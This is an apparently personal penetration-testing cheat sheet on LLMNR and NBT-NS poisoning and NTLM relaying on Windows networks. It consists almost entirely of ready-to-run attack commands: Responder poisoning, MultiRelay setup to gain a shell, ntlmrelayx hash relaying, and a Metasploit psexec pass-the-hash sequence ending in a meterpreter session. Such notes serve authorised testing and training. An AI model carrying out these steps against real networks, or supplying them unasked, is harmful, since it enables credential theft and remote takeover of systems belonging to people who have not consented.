# LLMNR and NBT-NS poisoning/relaying
### Responder and gaining shell with MultiRelay
1. Set up `MultiRelay.py`
   * _`rm /usr/share/responder/tools/MultiRelay/bin/Runas.exe`_ - in case it doesn't work initially
   * _`rm /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe`_ - in case it doesn't work initially
   * _`x86_64-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv`_
   * _`x86_64-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode`_
   * `cd /usr/share/responder/tools/` - must be in the `MultiRelay` in order for the tool to get proper locations of the above files
   * **`python3 MultiRelay.py -t <target> -u ALL`**</br>
      - where `-u ALL` -> users
2. Run `Responder`
   * `responder -I <interface> -rdwv --lm`

### Responder and relay with ntlmrelayx
1. Edit `Responder.conf` and set `SMB` and `HTTP` to **OFF**
2. Create `targets.txt with targets IP` for `impacket-ntlmrelayx`
3. `impacket-ntlmrelayx -tf targets.txt -smb2support` -> will relay NTLMv1/2 and get NTLM hashes (these can be used to PTH)
4. `responder -I <interface> --lm -rdwv` -> will get NTLMv1/2 aka NET-NTLM hashes (these cannot be used in PTH)
5. Metasploit 
   * `use exploit/windows/smb/psexec`
   * `set smbpass <NTLM_hash>`
   * set all other options
   * `run` and get meterpreter

## Cool resources
https://book.hacktricks.xyz/shells/shells/windows#regsvr32
https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
